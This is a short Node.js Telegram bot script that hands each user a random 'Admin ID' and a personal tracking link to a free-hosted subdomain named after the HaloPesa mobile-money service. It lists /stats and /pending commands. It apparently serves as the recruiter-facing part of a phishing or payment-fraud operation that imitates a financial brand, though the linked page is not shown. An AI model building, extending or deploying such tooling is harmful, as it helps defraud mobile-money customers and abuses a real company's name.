const TelegramBot = require('node-telegram-bot-api');

const token = 'YOUR_BOT_TOKEN';
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    let adminId = "ADMIN" + Math.floor(Math.random() * 1000);

    let link = `https://halopesa-j7o1.onrender.com?admin=${adminId}`;

    bot.sendMessage(chatId,
`🎉 YOU'RE NOW AN ADMIN!

Your Admin ID: ${adminId}

Your Personal Link:
${link}

Commands:
/mylink /stats /pending /myinfo`);
});
